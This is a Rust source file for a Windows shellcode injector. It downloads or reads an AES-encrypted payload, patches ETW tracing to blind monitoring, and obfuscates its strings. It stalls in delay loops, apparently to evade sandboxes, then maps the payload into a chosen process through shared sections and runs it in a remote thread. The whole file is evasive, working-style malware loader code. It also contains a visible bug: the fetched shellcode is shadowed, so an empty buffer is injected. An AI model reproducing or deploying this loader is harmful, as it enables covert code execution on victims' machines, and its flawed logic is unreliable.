#![allow(unused_variables)]
#![allow(non_snake_case)]

mod types;
use types::*;
use obfstr::obfstr;
use std::ptr::null_mut;
use std::{env, ffi::c_void, mem};
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use export_resolver::ExportList;
use windows::Win32::System::Diagnostics::Debug::FlushInstructionCache;
use windows::Win32::Foundation::{GetLastError, HANDLE, CloseHandle};
use windows::Win32::System::Memory::{PAGE_EXECUTE_READ,PAGE_EXECUTE_READWRITE,PAGE_READWRITE};
use windows::Win32::System::Threading::{GetCurrentProcess,PROCESS_ALL_ACCESS};

#[no_mangle]
#[link_section = ".text"]
static AES_KEY: [u8; 16] = [0xB1, 0xBF, 0x4B, 0xF7,0x6C, 0x13, 0x08, 0x82,0xB2, 0x30, 0x2E, 0xFE,0xB7, 0x2F, 0x34, 0xD2];
static AES_IV: [u8; 16] = [0xE9, 0xA7, 0xA3, 0x15,0xF6, 0x52, 0x2A, 0x07,0x5B, 0x25, 0xEC, 0x65,0x9D, 0x21, 0x0E, 0x6B];

struct ApiResolver {
    exports: ExportList<'static>,
}

// An api helper that wraps dynamic exports to make things easier
impl ApiResolver {
    fn new() -> Self { ApiResolver {
            exports: ExportList::new(),
        }
    }

    // Get reference to the export from NTDLL/KERNEL32
    fn get_addr(&mut self, dll: &'static str, func: &'static str) -> usize {
        self.exports.add(dll, func)
            .unwrap_or_else(|_| 
                panic!("{}{}{}", obfstr!(" Couldn't add "), dll, func));

        // Retrieve the virtual adress of the function
        let addr = self.exports.get_function_address(func)
            .unwrap_or_else(|_|
                 panic!("{}{}{}", obfstr!(" No adress for "), dll, func));
        
        return addr as usize
    }
}


unsafe fn patch_etw() {
    let mut api = ApiResolver::new();
    let ntTraceAddr = api.get_addr(&NTDLL_DLL, &NTTRACE) as *mut c_void;
    let writeProcMem = api.get_addr(&KERNEL32_DLL, &WRITEPROC);
    let writeProcMem: WriteProcessMemoryFn = mem::transmute(writeProcMem);

    let patch = [0xC3u8];  // x86 RET opcode
    let written = 0 as *mut usize;

    let result = writeProcMem(
        GetCurrentProcess(),
        ntTraceAddr,
        patch.as_ptr() as _,
        1,
        written);

    drop(api);
    if result == 0 {
        panic!("{}{}", obfstr!("WriteProcessMemory failed:"), GetLastError().0);
    }
    
    println!("{}{:?}", obfstr!("[+] Patched ETW at"),  ntTraceAddr);
    
}


unsafe fn get_proc_handle(pid: u32) -> HANDLE {
    let mut api = ApiResolver::new();
    let openProcess = api.get_addr(&KERNEL32_DLL, &OPENPROC);
    let openProcess: OpenProcessFn = mem::transmute(openProcess);

    let process_handle = openProcess(
        PROCESS_ALL_ACCESS.0,
        false,
        pid
    );
    drop(api);

    if process_handle.0.is_null() {
        panic!("{}{}{}", obfstr!("[-] OpenProcess failed on: "), pid, GetLastError().0);
        
    }

    println!("{}{}",obfstr!("[+] Got handle to PID ->"), &pid);
    return process_handle
}


unsafe fn create_section(cipher: Vec<u8>) -> (HANDLE, usize, Vec<u8>) {
    let mut api = ApiResolver::new();
    let exitThread = api.get_addr(&KERNEL32_DLL, &EXITTHREAD);
    let exitThread: ExitThreadFn = mem::transmute(exitThread);

    let blob = build_tramp(exitThread as usize, cipher);
    let mut max_size = blob.len() as i64;
    drop(api);
    
    let mut api = ApiResolver::new();
    let ntCreateSection = api.get_addr(&NTDLL_DLL, &NTCREATESECTION);
    let ntCreateSection: NtCreateSectionFn = mem::transmute(ntCreateSection);
    let mut section = HANDLE(null_mut());

    //Create local section RWX
    let status = ntCreateSection(
        &mut section,
        0x0004 | 0x0002 | 0x0008,    
        null_mut(),
        &mut max_size,
        PAGE_EXECUTE_READWRITE.0,
        0x8000_000,               
        HANDLE(null_mut()),
    );
    drop(api);
    
    if status < 0 {
        panic!("{}{}", obfstr!("[-] NtCreateSection failed: "), GetLastError().0);
    }

    println!("{}{:?}", obfstr!("[+] Created section at -> "), &section);
    return (section, max_size as usize, blob)
    
}


unsafe fn map_sections(process_handle: HANDLE, section_handle: HANDLE, mut max_size: usize) -> (*mut c_void, *mut c_void) {
    let mut api = ApiResolver::new();
    let ntMapView = api.get_addr(&NTDLL_DLL, &NTMAPVIEW);
    let ntMapView: NtMapViewOfSectionFn = mem::transmute(ntMapView);
    let mut local_base: *mut c_void = null_mut();
    let mut remote_base: *mut c_void = null_mut();

    //Map local (RW)
    let status = ntMapView(
        section_handle,
        GetCurrentProcess(),
        &mut local_base,
        0,
        0,
        null_mut(),
        &mut max_size,
        2,
        0,
        PAGE_READWRITE.0,
    );
    
    if status < 0 {
        panic!("{}{}", obfstr!("[-] (Local) NtMapViewOfSection failed:"), GetLastError().0);
    }
    println!("{}{:?}", obfstr!("[+] Mapped local section at -> "), &local_base);

    //Map remote (RX)
    let status = ntMapView(
        section_handle,
        process_handle,
        &mut remote_base,
        0,
        0,
        null_mut(),
        &mut max_size,
        2,
        0,
        PAGE_EXECUTE_READ.0,
    );
    drop(api);
    
    if status < 0 {
        panic!("{}{}", obfstr!("[-] (Remote) NtMapViewOfSection failed:"), GetLastError().0);
    }
    println!("{}{:?}", obfstr!("[+] Mapped remote section at ->"), &remote_base);

    return (local_base, remote_base)
}


unsafe fn inject_and_exec(process_handle: HANDLE, local_base: *mut c_void, remote_base: *mut c_void, blob: Vec<u8>) -> HANDLE {
    std::ptr::copy_nonoverlapping(blob.as_ptr(), local_base as *mut u8, blob.len());
    println!("[+]{}{}", blob.len(), obfstr!(" Bytes written to shared section"));

    let mut api = ApiResolver::new();
    let ntUnmapView = api.get_addr(&NTDLL_DLL, &NTUNMAPVIEW);
    let ntUnmapView: NtUnmapViewOfSectionFn = mem::transmute(ntUnmapView);
    ntUnmapView(GetCurrentProcess(), local_base);       //Unmap local view before creating thread
    drop(api);

    let base_ptr: *const c_void = remote_base as *const c_void;
    FlushInstructionCache(process_handle, Some(base_ptr), blob.len()).expect(obfstr!("Failed to flush cache"));

    let mut api = ApiResolver::new();
    let ntCreateThread = api.get_addr(&NTDLL_DLL, &NTCREATETHREAD);
    let ntCreateThread: NtCreateThreadExFn = mem::transmute(ntCreateThread);

    //Create remote thread
    let mut h_thread = HANDLE::default();
    let status = ntCreateThread(
        &mut h_thread,                
        0x1FFFFF,                     
        std::ptr::null_mut(),         
        process_handle,              
        remote_base,                  
        std::ptr::null_mut(),         
        0,                            
        0,                            
        0,                            
        0,                            
        std::ptr::null_mut(),         
    );
    drop(api);

    let mut api = ApiResolver::new();
    let ntWaitForObject = api.get_addr(&NTDLL_DLL, &NTWAITOBJECT);
    let ntWaitForObject: NtWaitForSingleObjectFn = mem::transmute(ntWaitForObject);

    ntWaitForObject(h_thread, 0, 1000 as *mut i64);
    drop(api);

    if status < 0 {
        panic!("{}{}", obfstr!("[-] NtCreateRemoteThread failed:"), GetLastError().0);
    }

    println!("{}{:?}", obfstr!("[+] Spawned remote thread @"), remote_base);
    
    return h_thread
}

unsafe fn decrypt_shellcode(mut shellcode: Vec<u8>) -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    cipher.decrypt(&mut shellcode);

    return shellcode
}

unsafe fn build_tramp(exit_thread_addr: usize, shellcode: Vec<u8>) -> Vec<u8> {
    let shellcode = decrypt_shellcode(shellcode.to_vec());
    let mut tramp = Vec::with_capacity(shellcode.len() + 32);

    // Prologue
    tramp.extend(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
    //Shellcode
    tramp.extend_from_slice(&shellcode);
    //   32B shadow for ExitThread call 
    tramp.extend(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
    tramp.extend(&[0x48, 0x31, 0xC9]);       // xor rcx, rcx       ; dwExitCode = 0
    tramp.extend(&[0x48, 0xB8]);             // movabs rax, imm64
    tramp.extend(&exit_thread_addr.to_le_bytes()); // address of ExitThread
    tramp.extend(&[0xFF, 0xD0]);             // call rax           ; ExitThread(0)

    return tramp
}

fn take_a_nap(delay: u16) {
    for _ in 0..delay {
        for _ in 0..10 {
            for _ in 0..10 {
                for _ in 0..10 {
                    print!("{}", obfstr!(""));
                }
            }
        }
    }
}

fn main() {
    take_a_nap(5000);

    unsafe {
        let pid: u32 = env::args().nth(1).expect(obfstr!("Missing PID!")).parse().unwrap();
        let url_or_file = env::args().nth(2).expect(obfstr!("Missing file or remote url!"));
        let shellcode: Vec<u8> = Vec::new();
        let is_http = url_or_file.starts_with("http");

        if is_http {
            let client = reqwest::blocking::Client::new();
            let shellcode = client.get(url_or_file)
            .send()
            .unwrap()
            .bytes()
            .unwrap()
            .to_vec();

        } else {
            let shellcode = std::fs::read(&url_or_file).unwrap();
        }
    
        patch_etw();
        take_a_nap(500);

        let process_handle = get_proc_handle(pid);
        take_a_nap(500);

        let (section_handle, max_size, blob) = create_section(shellcode);
        take_a_nap(500);

        let (local_base, remote_base) = map_sections(process_handle, section_handle, max_size);
        take_a_nap(500);

        CloseHandle(section_handle).ok();
        take_a_nap(500);
        
        let thread_handle = inject_and_exec(process_handle, local_base, remote_base, blob);
        take_a_nap(500);

        CloseHandle(process_handle).ok();
        CloseHandle(thread_handle).ok();
    }
}